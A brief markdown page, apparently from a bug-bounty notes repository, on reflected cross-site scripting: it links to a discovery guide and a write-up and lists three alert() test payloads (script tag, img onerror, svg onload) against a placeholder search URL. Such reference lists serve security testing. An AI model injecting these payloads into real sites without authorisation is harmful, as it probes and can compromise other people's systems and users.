# Cross-Site Scripting (XSS)
1. [Finding XSS using Web Archive](https://github.com/djmahe4/bug-bounty/blob/main/XSS/Wayback.md)
## Reflected XSS
1. ```https://www.target.net/inc.search_ney.php```>```<script>alert()</script>```,```<img src=x onerror=alert()>```,```<svg onload=alert()>``` >[link](https://medium.com/@osamaashraf1233/reflected-cross-site-scripting-in-search-functionality-d584593b966f)
